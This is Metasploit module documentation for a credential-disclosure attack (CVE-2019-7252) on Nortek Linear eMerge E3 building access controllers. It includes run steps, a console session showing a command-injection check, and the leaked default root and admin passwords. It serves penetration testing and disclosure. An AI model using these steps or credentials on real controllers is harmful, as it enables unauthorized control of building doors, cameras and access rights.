## Vulnerable Application

Nortek Security & Control, LLC (NSC) is a leader in wireless security, home automation and personal safety systems and devices.
The eMerge E3-Series is part of Linear’s access control platform, that delivers entry-level access control to buildings.
It is a web based application where the HTTP web interface is typically exposed to the public internet.

Building Automation and Access Control systems are at the heart of many critical infrastructures, and their security is vital.
Executing attacks on these systems may enable unauthenticated attackers to access and manipulate doors, elevators, air-conditioning systems,
cameras, boilers, lights, safety alarm systems in an entire building.

Default credentials exist within a vulnerable configuration on the Linear eMerge E3 access controller that can be easily leveraged
to gain privileged access to the system.

The first credential vulnerability is based on a default root password that is stored in `/etc/passwd`.
This can be used to escalate to root privileges using the RCE vulnerability CVE-2019-7256 or use these credentials in combination
with ssh (if enabled) to get root access to the access controller.

The second credential vulnerability allows an unauthenticated malicious actor to obtain the admin web credentials admin from the
spider database that is accessible and readable for the world on the access controller.
With this access, the malicious actor is able to control the Linear eMerge E3 access controller platform, the access to building,
its cameras and the authority to manage the access rights of users.

This issue affects all Linear eMerge E3 versions up to and including `1.00-06`.

Installing a vulnerable test bed requires a Linear eMerge E3 access controller with the vulnerable software loaded.

This module has been tested against a Linear eMerge access controller with the specifications listed below:

* Nortek Linear eMerge E3 access controller
* Firmware < `v1.00-03`

## Verification Steps

1. `use auxiliary/admin/http/linear_emerge_cred_disclosure_cve_2019_7252`
1. `set RHOSTS <TARGET HOSTS>`
1. `run`
1. You should be able to check if the default root password `davestyle` is available and retrieve the admin web credentials.

## Options
`STORE_CRED <true/false>` which allows you to store the leaked credentials in the creds database of Metasploit

## Scenarios

### Nortek Linear eMerge E3 access controller credential disclosure

```
msf6 > use auxiliary/admin/http/linear_emerge_cred_disclosure_cve_2019_7252
msf6 auxiliary(admin/http/linear_emerge_cred_disclosure_cve_2019_7252) > options

Module options (auxiliary/admin/http/linear_emerge_cred_disclosure_cve_2019_7252):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   STORE_CRED  true             no        Store credentials into the database.
   TARGETURI   /                yes       Linear eMerge E3 path
   VHOST                        no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/http/linear_emerge_cred_disclosure_cve_2019_7252) > set rhosts 192.168.100.180
rhosts => 192.168.100.180
msf6 auxiliary(admin/http/linear_emerge_cred_disclosure_cve_2019_7252) > run
[*] Running module against 192.168.100.180

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.100.180:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 5 seconds.
[*] Elapsed time: 5.813634401994932 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Retrieving admin web credentials...
[+] Admin web credentials found: admin:cuckoo
[*] Credentials admin:cuckoo are added to the database...
[*] Checking for default root system credentials...
[+] Default root system credentials found: root:davestyle
[*] Credentials root:davestyle are added to the database...
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/linear_emerge_cred_disclosure_cve_2019_7252) > creds 192.168.100.180
Credentials
===========

host             origin           service        public  private    realm  private_type  JtR Format
----             ------           -------        ------  -------    -----  ------------  ----------
192.168.100.180  192.168.100.180  80/tcp (http)  root    davestyle         Password
192.168.100.180  192.168.100.180  80/tcp (http)  admin   cuckoo            Password
```

## Limitations
No limitations.
